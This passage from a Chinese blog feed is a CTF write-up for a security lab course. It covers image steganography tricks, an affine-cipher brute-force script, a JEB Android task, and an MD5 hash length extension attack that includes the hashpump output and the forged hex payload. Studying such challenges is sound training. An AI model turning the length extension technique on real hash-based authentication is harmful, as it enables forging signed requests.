example</span><br></pre></td></tr></table></figure></p><h4 id="大家来找茬"><a href="#大家来找茬" class="headerlink" title="大家来找茬"></a>大家来找茬</h4><p>这个题目考了两个点，一个是<code>binwalk</code>分离图片出来，另外就是两个图片做各种运算，又得用到<code>StegSolve</code>，这种类型的题目最近的网鼎杯好像也有，反正套路就那样<br>先放进去<code>binwalk</code>检测一下发现有两张图，分离出来即可<br><a href="https://imgchr.com/i/i8Qbh8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/05/i8Qbh8.md.png" alt="i8Qbh8.md.png"></a><br><code>foremost diff.png -o 文件夹名字</code> 分离出来<br>然后利用<code>StegSolve</code>的<code>Image Combiner</code>功能对两张图片进行到<code>sub</code>运算的时候就有一张二维码<br><img src="https://s1.ax1x.com/2018/10/05/i8QO1g.png" alt="i8QO1g.png"></p><p>扫一下就可以得到flag</p><h4 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h4><p>这个题目又是MD5长度拓展攻击，如果对原理不太熟悉的人坑做这个题目的时候还是有点卡顿的，建议大家上网自己搜搜学习一下，接着用神器<code>hsahpump</code>来完成这题就好，我这里用的输入是<code>cyr</code>，毕竟原来的题目把这个cyr的MD5已经给出来了，我们也好构造hash长度拓展攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 4dbe35eaea655b0a2b0d06391175b8a3</span><br><span class="line">Input Data: cyr</span><br><span class="line">Input Key Length: 16</span><br><span class="line">Input Data to Add: abc</span><br><span class="line">d233e1c6060cc4af248ad189eda145fc</span><br><span class="line">cyr\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98\x00\x00\x00\x00\x00\x00\x00abc</span><br></pre></td></tr></table></figure></p><p>记得要把输入的16进制哟个空格隔开<br>我的payload<br><code>63 79 72 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 00 00 00 00 00 00 00 61 62 63</code><br>输入的hash值<br><code>d233e1c6060cc4af248ad189eda145fc</code><br>这就可以输出flag了</p><h4 id="猜猜看"><a href="#猜猜看" class="headerlink" title="猜猜看"></a>猜猜看</h4><p>这个题目提示了用j开头的软件对图片进行了相关的隐写，猜测是jphide，<br>然后取出对应的工具jphide来把里面的内容给取出来，发现需要密码<br><a href="https://imgchr.com/i/i8Qxns" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/05/i8Qxns.md.png" alt="i8Qxns.md.png"></a><br>再去看看题目发现说你要的是flag哦，可能密码就是flag试一下，会出现一段二进制编码<br>解码一下发现是一个base64的图片<br><a href="https://imgchr.com/i/i8lS7q" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/05/i8lS7q.md.png" alt="i8lS7q.md.png"></a><br>然后保存放进HTML页面里就可以得到一张二维码，最后扫一下即可<br><img src="https://s1.ax1x.com/2018/10/05/i8l9A0.png" alt="i8l9A0.png"></p><h4 id="PS-Master"><a href="#PS-Master" class="headerlink" title="PS Master"></a>PS Master</h4><p>这个题目完全就是一个ps的题目<br>首先用HXD打开发现是一个GIF图片我们可以用ps打开发现里面的图层有一张二维码，先把他保存起来，然后对其进行修改，用快速选择工具将它右上角的狗给选择下，然后右键选择黑色去填充<br><img src="https://s1.ax1x.com/2018/11/30/FmGPxS.png" alt="FmGPxS.png"></p><p>然后<code>ctrl + j</code>复制图层然后<code>ctrl + t</code>自由变换把这块覆盖左上角，同理覆盖 左下角<br><code>ctrl + r</code>标尺对齐然后从上面的尺子往下拖，从左边的往右拖，会有淡蓝色的参考系，这样就能够对齐啦<br><a href="https://imgchr.com/i/FmGFKg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmGFKg.md.png" alt="FmGFKg.md.png"></a><br>扫一下即可得到flag</p><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>这个题目考的是仿射密码，直接爆破key就好了，直接上脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">encode = <span class="string">'joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line"><span class="keyword">for</span> key2 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> encode:</span><br><span class="line">flag += chr((key1 * (ord(k)<span class="number">-97</span>) + key2 ) % <span class="number">26</span> + <span class="number">97</span>);</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> flag:</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">flag  = <span class="string">''</span></span><br></pre></td></tr></table></figure></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h4><p>这个题目意思很明确叫你用Jeb打开，但是上网搜了很久最后找到了个很古老版本的Jeb打开，里面有一个flag，直接打开那个文件即可看见flag<br><a href="https://imgchr.com/i/FmGnP0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmGnP0.md.png" alt="FmGnP0.md.png"></a><br>但是个人觉得另外一个安卓逆向工具Android Killer更好用。。。。。也能看到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在上网路安全实验课程的时候，其中一个任务就是完成这里面的题目，我还是记录一下吧，
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
</feed>
